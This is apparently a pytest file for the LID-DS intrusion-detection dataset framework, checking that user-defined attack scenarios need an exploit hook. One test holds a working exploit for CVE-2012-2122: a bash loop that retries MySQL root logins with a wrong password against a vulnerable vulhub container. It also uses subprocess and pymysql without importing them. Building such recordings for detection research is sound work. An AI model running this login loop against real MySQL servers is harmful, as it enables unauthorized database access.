"""
test the creation and execution of user defined scenarios
"""
from pytest import raises
from lid_ds.core import Scenario

def test_subclass_scenario_not_implement_abstract():
    """
    defining a scenario-implementation derived from
    the base scenario without a exploit hook
    should raise an exception
    """
    #pylint: disable=R0903, W0223
    class DerivedScenario(Scenario):
        """
        a custom scenario without the exploit hook
        """
    with raises(TypeError):
        #pylint: disable=E0110
        DerivedScenario()

def test_subclass_scenario_implement_abstract():
    """
    defining a correct scenario should not raise
    an exception
    """
    #pylint: disable=R0903
    class CVE_2012_2122(Scenario):
        def exploit(self, container):
            subprocess.Popen(r'''#!/bin/bash
                    for i in `seq 1 1000`;
                    do
                        mysql -uroot -pwrong -h 127.0.0.1 -P3306 ;
                    done''', shell=True, executable='/bin/bash')

        def wait_for_availability(self, container):
            try:
                db = pymysql.connect("localhost", "root", "123456")
            except Exception:
                print('MySQL Server is still down!')
                return False
            print('MySQL server is up - we can start simulating users!')
            return True
    CVE_2012_2122(
        'vulhub/mysql:5.5.23',
        port_mapping={
            '3306/tcp' : 3306
        },
        warmup_time=15,
        recording_time=45,
        behaviours=[],
        exploit_start_time=25 # Comment this line if you don't want the exploit to be executed
    )
